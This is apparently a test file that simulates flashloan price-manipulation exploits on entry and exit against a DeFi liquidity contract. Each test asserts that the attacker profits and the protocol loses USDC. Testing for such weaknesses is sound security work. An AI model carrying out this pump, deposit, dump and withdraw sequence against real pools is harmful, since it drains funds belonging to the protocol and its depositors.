import {
  balanceETH,
  balanceUSDC,
  deadline,
  dumpPriceETH,
  nexus,
  pumpPriceETH,
  quote,
  startNexusBalanceUSDC,
  usdcWhale,
} from "./test-base";
import { bn, bn18, bn6, ether, fmt18, fmt6, zero } from "../src/utils";
import { expect } from "chai";

describe("flashloan exploit simulation", () => {
  beforeEach(async () => {
    await nexus.methods.setPriceOracle("0").send();
  });

  it("exploit on entry", async () => {
    const startPrice = await quote();
    const startBalanceETH = await balanceETH(usdcWhale);
    const startBalanceUSDC = await balanceUSDC(usdcWhale);

    const investUSDC = bn6("500,000,000");

    const amountToReturnETH = await pumpPriceETH(investUSDC);

    const available = bn(await nexus.methods.availableSpaceToDepositETH().call());
    await nexus.methods.addLiquidityETH(usdcWhale, deadline).send({ value: available, from: usdcWhale });

    await dumpPriceETH(amountToReturnETH);

    await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });

    console.log("exploit on entry results:");
    console.log("total invested USDC", fmt6(investUSDC));
    const endDiffUSDC = (await balanceUSDC(usdcWhale)).sub(startBalanceUSDC);
    console.log("attacker diff USDC", fmt6(endDiffUSDC));
    expect(endDiffUSDC).bignumber.gt(zero);
    const endDiffETH = (await balanceETH(usdcWhale)).sub(startBalanceETH);
    console.log("attacker diff ETH", fmt18(endDiffETH));
    expect(endDiffETH).bignumber.lt(zero);

    const lossETHinUSD = endDiffETH.abs().mul(startPrice).div(ether);
    console.log("attacker loss ETH in USD", fmt6(lossETHinUSD));

    const fee = investUSDC.muln(1).divn(1000);
    console.log("estimated fee USDC", fmt6(fee));

    const profit = endDiffUSDC.sub(fee).sub(lossETHinUSD);
    console.log("attacker estimated profit USDC", fmt6(profit));
    expect(profit).bignumber.gt(zero);

    const loss = (await balanceUSDC()).sub(startNexusBalanceUSDC);
    console.log("nexus loss USDC", fmt6(loss));
    expect(loss).bignumber.lt(zero);

    const endPrice = await quote();
    console.log("start price", fmt6(startPrice));
    console.log("end price", fmt6(endPrice));
    console.log("possible additional price arbitrage", fmt6(endPrice.sub(startPrice)));
  });

  it("exploit on exit", async () => {
    const startPrice = await quote();
    const startBalanceETH = await balanceETH(usdcWhale);
    const startBalanceUSDC = await balanceUSDC(usdcWhale);

    const available = bn(await nexus.methods.availableSpaceToDepositETH().call());
    await nexus.methods.addLiquidityETH(usdcWhale, deadline).send({ value: available, from: usdcWhale });

    const investETH = bn18("300,000");
    const totalInvestETH = available.add(investETH);

    const amountToReturnUSDC = await dumpPriceETH(investETH);

    await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });

    await pumpPriceETH(amountToReturnUSDC);

    console.log("exploit on exit results:");
    console.log("total invested ETH", fmt18(totalInvestETH));
    const endDiffUSDC = (await balanceUSDC(usdcWhale)).sub(startBalanceUSDC);
    console.log("attacker diff USDC", fmt6(endDiffUSDC));
    expect(endDiffUSDC).bignumber.zero;
    const endDiffETH = (await balanceETH(usdcWhale)).sub(startBalanceETH);
    console.log("attacker diff ETH", fmt18(endDiffETH));
    expect(endDiffETH).bignumber.gt(zero);

    const fee = totalInvestETH.muln(1).divn(1000);
    console.log("estimated fee ETH", fmt18(fee));

    const profit = endDiffETH.sub(fee);
    console.log("attacker estimated profit ETH", fmt18(profit));
    expect(profit).bignumber.gt(zero);

    const loss = (await balanceUSDC()).sub(startNexusBalanceUSDC);
    console.log("nexus loss USDC", fmt6(loss));
    expect(loss).bignumber.lt(zero);

    const endPrice = await quote();
    console.log("start price", fmt6(startPrice));
    console.log("end price", fmt6(endPrice));
    console.log("possible additional price arbitrage", fmt6(endPrice.sub(startPrice)));
  });
});
